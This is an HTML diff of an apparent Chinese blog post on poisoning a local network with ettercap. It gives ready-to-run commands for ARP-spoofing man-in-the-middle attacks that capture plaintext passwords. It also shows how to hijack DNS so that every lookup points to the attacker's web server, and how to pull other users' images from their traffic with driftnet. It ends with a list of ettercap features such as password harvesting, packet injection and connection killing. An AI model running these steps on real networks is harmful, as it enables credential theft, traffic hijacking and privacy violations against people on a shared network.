+<h3 id="1-抓取用户连接网站的明文密码"><a href="#1-抓取用户连接网站的明文密码" class="headerlink" title="1.抓取用户连接网站的明文密码"></a>1.抓取用户连接网站的明文密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i eth0 -Tq -M arp:remote /// ///</span><br></pre></td></tr></table></figure>
+
+<p><del>仅限于裸的连接，</del></p>
+<h3 id="2-劫持DNS，给同一网段下的用户推送你的网页"><a href="#2-劫持DNS，给同一网段下的用户推送你的网页" class="headerlink" title="2.劫持DNS，给同一网段下的用户推送你的网页"></a>2.劫持DNS，给同一网段下的用户推送你的网页</h3><h5 id="0x1修改ettercap的DNS配置文件"><a href="#0x1修改ettercap的DNS配置文件" class="headerlink" title="0x1修改ettercap的DNS配置文件"></a>0x1修改ettercap的DNS配置文件</h5><p>文件路径在 /etc/ettercap/etter.dns </p>
+<p>在文件中加入，注意下文的ip地址是我们主机的ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*  A 192.168.0.122</span><br><span class="line">*  PTR 192.168.0.122</span><br></pre></td></tr></table></figure>
+
+<p>作用是将所有解析都连到我们的主机上</p>
+<h5 id="0x2搭建web服务"><a href="#0x2搭建web服务" class="headerlink" title="0x2搭建web服务"></a>0x2搭建web服务</h5><p>然后我选择开启apache服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>web服务的默认目录为 /var/www/html/</p>
+<p>接着启用ettercap中的dns_spoof插件进行欺骗，完成DNS劫持</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -T -i wlan0 -q -P dns_spoof /// ///</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-截取用户的照片"><a href="#3-截取用户的照片" class="headerlink" title="3.截取用户的照片"></a>3.截取用户的照片</h3><p>ettercap+driftnet == everything</p>
+<p>先对内网进行嗅探，设置在wlan上嗅探，可根据实际情况修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan0 -Tq -M arp:remote /// ///</span><br></pre></td></tr></table></figure>
+
+<p>接着上driftnet</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo driftnet -i wlan0</span><br></pre></td></tr></table></figure>
+
+<p>解释一下driftnet的几个参数，根据实际情况使用</p>
+<blockquote>
+<p>-b               捕获到新的图片时发出嘟嘟声</p>
+<p>-i  interface     选择监听接口</p>
+<p>-f  file   读取一个指定pcap数据包中的图片</p>
+<p>-p  不让所监听的接口使用混杂模式</p>
+<p>-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）</p>
+<p>-m number 指定保存图片数的数目</p>
+<p>-d directory  指定保存图片的路径</p>
+<p>-x prefix  指定保存图片的前缀名</p>
+</blockquote>
+<p>顺便举几个栗子：</p>
+<blockquote>
+<p>1.实时监听： driftnet -i wlan0</p>
+<p>2.读取一个指定pcap数据包中的图片： driftnet -f /root/Desktop/cap.pcapng -a -d /root/drifnet/</p>
+</blockquote>
+<h3 id="4-ettercap的常用功能"><a href="#4-ettercap的常用功能" class="headerlink" title="4.ettercap的常用功能"></a>4.ettercap的常用功能</h3><p> <a href="https://www.cnblogs.com/blacksunny/p/5246563.html" target="_blank" rel="noopener">参考</a></p>
+<blockquote>
+<ol>
+<li>在已有的连接上注入数据： 可以在维持原有连接不变的基础上想服务器或客户端注入数据，以达到模拟命令或响应的目的。</li>
+<li>SSH1支持：可以捕获SSH1连接上的User和Pass信息，甚至其他数据。（全双工）</li>
+<li>HTTPS支持：可以监听http SSL连接上加密数据，甚至通过Proxy的连接。</li>
+<li>监听通过GRE通道的远程通信：可以通过监听来自远程cisco路由器的GRE通道的数据流，并对它进行中间人攻击。</li>
+<li>Plug-in支持：通过Ettercap的API可以创建自己的Plug-in。</li>
+<li>口令收集：可以收集以下协议的口令信息：TELNET、FTP、POP、RLOGIN、SSH1、ICQ、SMB、MySQL、HTTP、NNTP、X11、NAPSTER、IRC、RIP、BGP、SOCK5、IMAP4、VNC、LDAP、NFS、SNMP、HALFLIFE、QUAKE3、MSNYMSG（不久还会有新的协议获得支持）.</li>
+<li>数据包过滤和丢弃：可以建立一个查找特定字符串（甚至包括十六进制数）的过滤链，根据这个过滤链对TCP/UDP数据包进行过滤并用自己的数据替换这些数据包，或丢弃整个数据包。</li>
+<li>被动的OS指纹提取：可以被动地（不必主动发送数据包）获取局域网上计算机系统的详细信息，包括操作系统版本、运行的服务、打开的端口、IP地址、MAC地址和网卡的生产厂家等信息。</li>
+<li>OS指纹：可以提取被控主机的OS指纹以及它的网卡信息（利用NMAP Fyodor数据库）.</li>
+<li>杀死一个连接：杀死当前连接表中的连接，甚至所有连接。</li>
+<li>数据包生产：可以创建和发送伪造的数据包，允许你伪造从以太报头到应用层的所有信息。</li>
+<li>把捕获的数据流绑定到一个本地端口：可以通过一个客户端软件连接到该端口上，进行进一步地协议解码或向其中注入数据（仅适用于基于ARP的方式）。</li>
+</ol>
+</blockquote>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jupmouse@gmail </span>
     </div>
@@ -358,12 +418,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>某即时通讯聊天软件防止撤回的patch</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">402</span></p>
+    <p><span class="copy-title">文章标题:</span>ettercap毒化内网的一些姿势</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.1k</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="2st">2st</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-30, 15:28:28</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-30, 15:28:28</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/30/%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%AD%A2%E6%92%A4%E5%9B%9E%E7%9A%84patch/" title="某即时通讯聊天软件防止撤回的patch">https://m-ouse.github.io/2019/11/30/%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%AD%A2%E6%92%A4%E5%9B%9E%E7%9A%84patch/</a>
+    <p><span class="copy-title">发布时间:</span>2019-12-10, 11:47:01</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-10, 11:47:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/10/ettercap%E6%AF%92%E5%8C%96%E5%86%85%E7%BD%91/" title="ettercap毒化内网的一些姿势">https://m-ouse.github.io/2019/12/10/ettercap%E6%AF%92%E5%8C%96%E5%86%85%E7%BD%91/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
